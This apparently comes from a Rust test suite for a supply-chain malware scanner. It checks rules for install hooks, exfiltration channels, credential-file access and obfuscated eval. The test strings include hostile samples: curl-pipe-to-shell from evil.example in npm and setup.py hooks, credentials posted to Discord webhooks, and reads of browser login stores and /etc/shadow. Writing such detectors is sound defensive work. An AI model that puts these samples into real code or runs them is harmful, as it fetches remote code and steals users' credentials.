    fn supply_chain_hook_rules(path: &str, source: &str) -> Vec<String> {
        let mut findings = Vec::new();
        scan_supply_chain_install_hooks(Path::new("/t"), Path::new(path), source, &mut findings);
        let mut ids: Vec<String> = findings.into_iter().map(|f| f.rule_id).collect();
        ids.sort();
        ids
    }

    #[test]
    fn gf559_flags_malicious_npm_install_hooks() {
        let fetch_exec = "{\n  \"scripts\": {\n    \"postinstall\": \"curl -s https://evil.example/x.sh | sh\"\n  }\n}\n";
        assert_eq!(
            supply_chain_hook_rules("/t/package.json", fetch_exec),
            vec!["GF-559"]
        );
        let inline_eval =
            "{ \"scripts\": { \"preinstall\": \"node -e require('child_process').exec('id')\" } }";
        assert!(
            supply_chain_hook_rules("/t/package.json", inline_eval).contains(&"GF-559".to_owned())
        );
        // A normal build hook does not fire.
        let benign =
            "{ \"scripts\": { \"postinstall\": \"node-gyp rebuild\", \"build\": \"tsc\" } }";
        assert_eq!(
            supply_chain_hook_rules("/t/package.json", benign),
            Vec::<String>::new()
        );
        // Only package.json is scanned.
        assert_eq!(
            supply_chain_hook_rules("/t/other.json", fetch_exec),
            Vec::<String>::new()
        );
    }

    #[test]
    fn gf563_flags_exfiltration_channel() {
        let js = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_pattern_language(
                Path::new("/t"),
                Path::new("/t/a.js"),
                src,
                "javascript",
                &mut f,
            );
            f.into_iter().filter(|x| x.rule_id == "GF-563").count()
        };
        assert_eq!(
            js("fetch('https://discord.com/api/webhooks/123/abc', {method:'POST'})"),
            1
        );
        assert_eq!(
            js("const u = 'https://api.telegram.org/bot123:ABC/sendMessage';"),
            1
        );
        assert_eq!(js("fetch('https://api.example.com/collect')"), 0);

        let py = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_pattern_language(Path::new("/t"), Path::new("/t/a.py"), src, "python", &mut f);
            f.into_iter().filter(|x| x.rule_id == "GF-563").count()
        };
        assert_eq!(
            py("requests.post('https://discordapp.com/api/webhooks/1/x', data=creds)"),
            1
        );
        assert_eq!(py("r = requests.get('https://api.github.com/user')"), 0);

        // The malware indicators are language-agnostic — a Go module fires too.
        let go = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_pattern_language(Path::new("/t"), Path::new("/t/a.go"), src, "go", &mut f);
            f.into_iter().filter(|x| x.rule_id == "GF-563").count()
        };
        assert_eq!(go("url := \"https://discord.com/api/webhooks/1/abc\""), 1);
    }

    #[test]
    fn gf562_flags_credential_store_access() {
        let py = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_pattern_language(Path::new("/t"), Path::new("/t/a.py"), src, "python", &mut f);
            f.into_iter().filter(|x| x.rule_id == "GF-562").count()
        };
        assert_eq!(
            py("open(os.path.expanduser('~/.mozilla/firefox/x/logins.json'))"),
            1
        );
        assert_eq!(py("db = sqlite3.connect('cookies.sqlite')"), 1);
        assert_eq!(py("with open('/etc/shadow') as f: pass"), 1);
        assert_eq!(py("config = load('settings.json')"), 0);

        let js = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_pattern_language(
                Path::new("/t"),
                Path::new("/t/a.js"),
                src,
                "javascript",
                &mut f,
            );
            f.into_iter().filter(|x| x.rule_id == "GF-562").count()
        };
        assert_eq!(js("const p = path.join(chromeDir, 'Login Data');"), 1);
        assert_eq!(js("fs.readFileSync(firefoxDir + '/key4.db')"), 1);
        assert_eq!(js("const data = fs.readFileSync('data.json');"), 0);
    }

    #[test]
    fn gf561_flags_obfuscated_dynamic_execution() {
        let js = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_javascript(Path::new("/t"), Path::new("/t/a.js"), src, &mut f);
            f.into_iter().filter(|x| x.rule_id == "GF-561").count()
        };
        assert_eq!(js("eval(atob('cGF5bG9hZA=='))"), 1);
        assert_eq!(
            js("const x = eval(Buffer.from(b, 'base64').toString());"),
            1
        );
        assert_eq!(js("eval(String.fromCharCode(104,105))"), 1);
        // A plain decode, or an eval of a non-decoded expression, does not fire.
        assert_eq!(js("const data = atob(encoded);"), 0);
        assert_eq!(js("eval(userExpression);"), 0);

        let py = |src: &str| -> usize {
            let mut f = Vec::new();
            scan_python(Path::new("/t"), Path::new("/t/a.py"), src, &mut f);
            f.into_iter().filter(|x| x.rule_id == "GF-561").count()
        };
        assert_eq!(py("exec(base64.b64decode('cHJpbnQoMSk='))"), 1);
        assert_eq!(py("eval(marshal.loads(data))"), 1);
        assert_eq!(py("exec(zlib.decompress(blob))"), 1);
        // A plain decode, or exec/eval of non-decoded data, does not fire.
        assert_eq!(py("data = base64.b64decode(x)"), 0);
        assert_eq!(py("exec(compile(src, '<s>', 'exec'))"), 0);
    }

    #[test]
    fn gf560_flags_setup_py_install_execution() {
        let shell_out =
            "from setuptools import setup\nimport os\nos.system('curl https://evil.example/x | sh')\nsetup(name='x')\n";
        assert_eq!(
            supply_chain_hook_rules("/t/setup.py", shell_out),
            vec!["GF-560"]
        );
        let obfuscated = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n";
        assert!(supply_chain_hook_rules("/t/setup.py", obfuscated).contains(&"GF-560".to_owned()));
        // A declarative setup.py does not fire.
        let benign =
            "from setuptools import setup, find_packages\nsetup(name='x', packages=find_packages())\n";
        assert_eq!(
            supply_chain_hook_rules("/t/setup.py", benign),
            Vec::<String>::new()
        );
    }

